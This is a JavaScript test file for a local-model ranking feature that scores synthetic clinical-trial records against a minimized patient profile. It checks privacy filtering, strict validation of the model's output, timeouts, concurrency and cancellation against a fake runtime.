import{parseRankingProfile,parseRankingStudies,parseLocalRankingResult,RANK_REASONS}from'../../shared/local-ranking.mjs';
const rankStudies=n=>Array.from({length:n},(_,i)=>({nctId:`NCT9999990${i}`,title:`Synthetic public study ${i}`,conditions:['Fibromyalgia'],summary:'A public synthetic summary.',criteria:'Inclusion Criteria: adults.'}));
const PROFILE={conditions:['fibromyalgia'],ageBand:'45_59',sex:'female',state:'ID'};
test('ranking contract: minimized profile and public records only; strict scores, catalog reasons and no probabilities',()=>{
 parseRankingProfile(PROFILE);parseRankingProfile({conditions:['fibromyalgia']});
 for(const bad of[{conditions:[]},{conditions:['x'],name:'PATIENT_CANARY'},{conditions:['x'],ageBand:'47'},{conditions:['x'],zip:'83702'},{conditions:['a\u0000']},{conditions:Array(7).fill('x').map((x,i)=>x+i)}])assert.throws(()=>parseRankingProfile(bad),JSON.stringify(bad));
 parseRankingStudies(rankStudies(10));assert.throws(()=>parseRankingStudies(rankStudies(11)));assert.throws(()=>parseRankingStudies([{...rankStudies(1)[0],notes:'x'}]));
 const body=buildLocalRankRequest(PROFILE,rankStudies(1)[0],'qwen3.5:9b'),sent=JSON.stringify(body);
 assert.ok(!/45_59|female|"ID"|ageBand|state/.test(sent.replace(body.messages[0].content,'')),'age band, sex and state never reach the model');assert.match(body.messages[1].content,/fibromyalgia/);assert.deepEqual(Object.keys(body.format.properties),['score','reasonId']);
 assert.deepEqual(parseLocalRankOutput('{"score":91,"reasonId":"condition_match"}'),{score:91,reasonId:'condition_match'});
 for(const bad of['{"score":95,"reasonId":"different_condition"}','{"score":10,"reasonId":"condition_match"}','{"score":91.5,"reasonId":"condition_match"}','{"score":101,"reasonId":"condition_match"}','{"score":80,"reasonId":"eligible"}','{"score":80,"reasonId":"condition_match","probability":0.9}','not json'])assert.throws(()=>parseLocalRankOutput(bad),{code:'LOCAL_INVALID_OUTPUT'},bad);
 assert.throws(()=>parseLocalRankingResult({provider:'local',model:'qwen3.5:9b',version:null,durationMs:1,studies:[{nctId:'NCT99999900',score:80,reasonId:'condition_match',probabilities:[1]}]},['NCT99999900']));
 assert.equal(Object.keys(RANK_REASONS).length,7);
});
test('ranking against the fake runtime: ten studies in input order, per-study validation, runtime failures stop the batch, Stop cancels',async()=>{
 const root=await mkdtemp(path.join(os.tmpdir(),'treatable-rank-'));let rt;try{
  const fake=await fakeOllama(root),dir=await modelsDir(root);rt=new OllamaRuntime({binary:fake.binary,modelsDir:dir});const studies=rankStudies(10),seen=[];
  let r=await runLocalRanking(rt,{profile:PROFILE,studies,model:'qwen3.5:9b'},{onStudy:x=>seen.push(x.nctId)});
  assert.deepEqual(r.studies.map(s=>s.nctId),studies.map(s=>s.nctId));assert.ok(r.studies.every(s=>Number.isInteger(s.score)&&s.reasonId));assert.equal(r.studies[0].reasonId,'different_condition');assert.equal(r.studies[1].score,89);assert.equal(seen.length,10);assert.equal(r.provider,'local');assert.equal(r.version,'0.99.0');
  const chats=(await readLines(fake.log)).filter(x=>x.path==='/api/chat');assert.equal(chats.length,10);assert.ok(chats.every(c=>c.body.think===false&&!JSON.stringify(c.body).includes('45_59')&&!JSON.stringify(c.body).includes('female')));
  r=await runLocalRanking(rt,{profile:PROFILE,studies,model:'qwen3.5:9b'},{concurrency:2});assert.equal(r.studies.filter(s=>s.score!==undefined).length,10,'concurrency 2 keeps input order');
  await fake.set({rank:'inconsistent'});r=await runLocalRanking(rt,{profile:PROFILE,studies,model:'qwen3.5:9b'});assert.deepEqual(r.studies.filter(s=>s.failure).map(s=>s.failure),Array(5).fill('LOCAL_INVALID_OUTPUT'),'a high score with a "different condition" reason is refused');
  await fake.set({rank:'invalid'});r=await runLocalRanking(rt,{profile:PROFILE,studies:studies.slice(0,3),model:'qwen3.5:9b'});assert.ok(r.studies.every(s=>s.failure==='LOCAL_INVALID_OUTPUT'));
  await fake.set({rank:'slow',chatDelay:5000});let t=Date.now();r=await runLocalRanking(rt,{profile:PROFILE,studies,model:'qwen3.5:9b'},{studyTimeout:400});assert.ok(Date.now()-t<3000);assert.ok(r.studies.every(s=>s.failure==='LOCAL_TIMEOUT'),'a model too slow for one study is not asked about the rest');
  r=await runLocalRanking(rt,{profile:PROFILE,studies:studies.slice(0,2),model:'nomic-embed-text:latest'});assert.ok(r.studies.every(s=>s.failure==='LOCAL_MODEL_UNAVAILABLE'));
  r=await runLocalRanking(MISSING_RUNTIME,{profile:PROFILE,studies:studies.slice(0,2),model:'qwen3.5:9b'});assert.ok(r.studies.every(s=>s.failure==='LOCAL_NOT_INSTALLED'));
  await fake.set({rank:'slow',chatDelay:20000});const controller=new AbortController();setTimeout(()=>controller.abort(),400);await assert.rejects(runLocalRanking(rt,{profile:PROFILE,studies,model:'qwen3.5:9b'},{signal:controller.signal}),{code:'CANCELLED'});
  await assert.rejects(runLocalRanking(rt,{profile:{conditions:['x'],name:'PATIENT_CANARY'},studies,model:'qwen3.5:9b'}));
 }finally{await rt?.stop();await rm(root,{recursive:true,force:true,maxRetries:10,retryDelay:100})}
});
